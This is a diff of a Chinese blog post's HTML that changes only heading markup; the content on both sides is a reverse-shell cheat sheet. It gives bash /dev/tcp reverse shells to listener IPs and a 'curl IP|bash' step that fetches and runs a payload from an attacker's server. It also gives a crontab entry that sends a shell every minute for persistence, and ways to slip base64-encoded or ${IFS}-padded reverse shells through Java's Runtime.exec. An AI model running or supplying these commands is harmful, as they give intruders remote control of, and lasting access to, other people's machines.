@@ -202,65 +202,54 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>Linux中默认的sh为bash，功能强大，支持多种语法，但还有<strong>ash、dash、ksh、csh、zsh</strong> </p>
+        <p>Linux中默认的sh为bash，功能强大，支持多种语法，但还有<strong>ash、dash、ksh、csh、zsh</strong></p>
 <span id="more"></span>
-
-<h2 id="最简单的bash反弹"><a href="#最简单的bash反弹" class="headerlink" title="最简单的bash反弹"></a>最简单的bash反弹</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.43.133/8081 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
-
-<h2 id="Curl配合Bash反弹shell"><a href="#Curl配合Bash反弹shell" class="headerlink" title="Curl配合Bash反弹shell"></a>Curl配合Bash反弹shell</h2><p>首先，在攻击者vps的web目录里面创建一个index文件（index.php或index.html），内容如下：</p>
+<h2 id="最简单的bash反弹"><a class="header-anchor" href="#最简单的bash反弹">¶</a>最简单的bash反弹</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.43.133/8081 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<h2 id="Curl配合Bash反弹shell"><a class="header-anchor" href="#Curl配合Bash反弹shell">¶</a>Curl配合Bash反弹shell</h2>
+<p>首先，在攻击者vps的web目录里面创建一个index文件（index.php或index.html），内容如下：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
-
 <p>并开启2333端口的监听。</p>
 <p>然后再目标机上执行如下，即可反弹shell：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 47.xxx.xxx.72|bash</span><br></pre></td></tr></table></figure>
-
 <p>curl IP|bash 中的IP可以是任意格式的，可以是十进制、十六进制、八进制、二进制等等。</p>
-<h2 id="将反弹shell命令写入定时任务"><a href="#将反弹shell命令写入定时任务" class="headerlink" title="将反弹shell命令写入定时任务"></a>将反弹shell命令写入定时任务</h2><p>我们可以在目标主机的定时任务文件中写入一个反弹shell的脚本，但是前提是我们必须要知道目标主机当前的用户名是哪个。因为我们的反弹shell命令是要写在 &#x2F;var&#x2F;spool&#x2F;cron&#x2F;[crontabs]&#x2F;<username> 内的，所以必须要知道远程主机当前的用户名。否则就不能生效。</p>
-<p>比如，当前用户名为root，我们就要将下面内容写入到 &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root 中。(centos系列主机)</p>
-<p>比如，当前用户名为root，我们就要将下面内容写入到 &#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root 中。(Debian&#x2F;Ubuntu系列主机)</p>
-<p>*&#x2F;1  *  *  *  *   &#x2F;bin&#x2F;bash -i&gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;47.xxx.xxx.72&#x2F;2333 0&gt;&amp;1</p>
+<h2 id="将反弹shell命令写入定时任务"><a class="header-anchor" href="#将反弹shell命令写入定时任务">¶</a>将反弹shell命令写入定时任务</h2>
+<p>我们可以在目标主机的定时任务文件中写入一个反弹shell的脚本，但是前提是我们必须要知道目标主机当前的用户名是哪个。因为我们的反弹shell命令是要写在 /var/spool/cron/[crontabs]/<username> 内的，所以必须要知道远程主机当前的用户名。否则就不能生效。</p>
+<p>比如，当前用户名为root，我们就要将下面内容写入到 /var/spool/cron/root 中。(centos系列主机)</p>
+<p>比如，当前用户名为root，我们就要将下面内容写入到 /var/spool/cron/crontabs/root 中。(Debian/Ubuntu系列主机)</p>
+<p>*/1  *  *  *  *   /bin/bash -i&gt;&amp;/dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1</p>
 <p>#每隔一分钟，向47.xxx.xxx.72的2333号端口发送shell</p>
-<h2 id="Java中使用Runtime-exec反弹shell"><a href="#Java中使用Runtime-exec反弹shell" class="headerlink" title="Java中使用Runtime.exec反弹shell"></a>Java中使用Runtime.exec反弹shell</h2><p>Java中使用</p>
+<h2 id="Java中使用Runtime-exec反弹shell"><a class="header-anchor" href="#Java中使用Runtime-exec反弹shell">¶</a>Java中使用Runtime.exec反弹shell</h2>
+<p>Java中使用</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(String cmd)</span><br></pre></td></tr></table></figure>
-
 <p>来执行命令，实际上java并不是直接将cmd交给系统去执行，而是会进行进一步处理，会使用空格来分割命令，并且不支持管道符</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.43.133/8081 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
-
 <p>就无法使用，大体上是根据(1)命令，(2)选项，(3)参数，来分割，那么参数部分就不能出现空格，如果出现空格，会将参数拆分</p>
 <p>并且不支持管道符，那么只能使用<code>bash -c 参数</code>的方式，参数部分为反弹shell的命令</p>
 <p>1.使用内置变量</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;IFS&#125;  内置变量取值为空格+TAB+换行（0x20 0x09 0x0a）</span><br></pre></td></tr></table></figure>
-
 <p>但是如果简单的使用${IFS}来填充</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c bash$&#123;IFS&#125;-i$&#123;IFS&#125;&amp;&gt;$&#123;IFS&#125;/dev/tcp/10.128.247.54/8081$&#123;IFS&#125;0&gt;&amp;1                                   bash: $&#123;IFS&#125;/dev/tcp/10.128.247.54/8081$&#123;IFS&#125;0: ambiguous redirect</span><br></pre></td></tr></table></figure>
-
 <p>${IFS}0语法有误，需要改成</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -c bash$&#123;IFS&#125;-i$&#123;IFS&#125;&amp;&gt;$&#123;IFS&#125;/dev/tcp/10.128.247.54/8081$&#123;IFS&#125;&lt;&amp;1</span><br><span class="line"></span><br><span class="line">Runtime.getRuntime().exec(&quot;bash -c bash$&#123;IFS&#125;-i$&#123;IFS&#125;&amp;&gt;$&#123;IFS&#125;/dev/tcp/10.128.247.54/8081$&#123;IFS&#125;&lt;&amp;1&quot;)</span><br></pre></td></tr></table></figure>
-
 <p>2.使用$@或$*</p>
 <p>$@和$*代表命令行传入的参数列表，可以利用其来忽略空格的影响</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#x27;$@|bash&#x27; 0 echo ls</span><br></pre></td></tr></table></figure>
-
 <p>当-c读取到$@时就会取参数 第一个0默认脚本名称，第二个echo为命令，第三个ls为参数</p>
 <p>那么实际上执行</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#x27;echo ls|bash&#x27;</span><br></pre></td></tr></table></figure>
-
 <p>反弹shell</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#x27;$@|bash&#x27; 0 echo &#x27;bash -i &gt;&amp; /dev/tcp/10.128.247.54/8081 0&gt;&amp;1&#x27;</span><br><span class="line"></span><br><span class="line">Runtime.getRuntime().exec(&quot;bash -c $@|bash 0 echo bash -i &gt;&amp; /dev/tcp/10.128.247.54/8081 0&gt;&amp;1&quot;)</span><br></pre></td></tr></table></figure>
-
 <p>2.使用bash64</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;bash -i &gt;&amp; /dev/tcp/10.128.247.54/8081 0&gt;&amp;1&#x27;|base64</span><br></pre></td></tr></table></figure>
-
 <p>然后解码bash64运行</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMjguMjQ3LjU0LzgwODEgMD4mMQo=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br><span class="line"></span><br><span class="line">Runtime.getRuntime().exec(&quot;bash -c bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMjguMjQ3LjU0LzgwODEgMD4mMQo=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;)</span><br></pre></td></tr></table></figure>
-
 <p>根据实测，runtime分割命令后，会自动给参数加上引号，因为正常的</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMjguMjQ3LjU0LzgwODEgMD4mMQo=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>
-
 <p>在系统中无法执行，需要加上引号才可以执行</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#x27;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMjguMjQ3LjU0LzgwODEgMD4mMQo=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span><br></pre></td></tr></table></figure>
-
-<h3 id="sh默认为dash时"><a href="#sh默认为dash时" class="headerlink" title="sh默认为dash时"></a>sh默认为dash时</h3><p>dash不支持{}语法，只能使用${IFS}来代替空格，可以结合curl使用，只需填充一个${IFS}字符</p>
+<h3 id="sh默认为dash时"><a class="header-anchor" href="#sh默认为dash时">¶</a>sh默认为dash时</h3>
+<p>dash不支持{}语法，只能使用${IFS}来代替空格，可以结合curl使用，只需填充一个${IFS}字符</p>
 <p>Reference:</p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/whatday/article/details/107098353">java Runtime.getRuntime().exec 获取反弹shell_whatday的博客-CSDN博客_exec反弹shell</a></p>
 
